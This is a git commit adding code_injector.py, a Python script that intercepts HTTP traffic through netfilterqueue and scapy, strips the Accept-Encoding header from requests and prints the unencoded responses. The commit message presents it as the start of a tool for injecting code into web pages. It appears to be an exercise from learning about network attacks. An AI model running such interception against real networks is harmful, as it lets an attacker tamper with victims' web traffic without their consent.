69ce143851fa17ef998cbe39b59e3bd9e11a5f78
Nedheesh Hasija <nedheesh.hasija@gmail.com>
2019-01-04 11:59:47 +0530

    Added new file code_injector.py
    So far this file can print http response of a web page but in actuality, the raw load part of that response will no longer be encoded. You will be able to see the raw html and javascript of the website

---
+++ code_injector.py
@@ -0,0 +1,34 @@
+import netfilterqueue
+import scapy.all as scapy
+import re
+
+
+
+def set_load(packet, load):
+    packet[scapy.Raw].load = load
+    del packet[scapy.IP].len
+    del packet[scapy.IP].chksum
+    del packet[scapy.TCP].chksum
+    return packet
+
+
+def process_packet(packet):
+
+    scapy_packet=scapy.IP(packet.get_payload())
+    if scapy_packet.haslayer(scapy.Raw):
+        if scapy_packet[scapy.TCP].dport == 80:
+            print("This is a request")
+            modified_load = re.sub("Accept-Encoding:.*?\\r\\n", "",scapy_packet[scapy.Raw].load)
+            new_packet = set_load(scapy_packet, modified_load)
+            packet.set_payload(str(new_packet))
+
+        elif scapy_packet[scapy.TCP].sport == 80:
+            print("This is a response")
+            print(scapy_packet.show())
+
+    packet.accept()
+
+
+queue = netfilterqueue.NetfilterQueue()
+queue.bind(0, process_packet)
+queue.run()
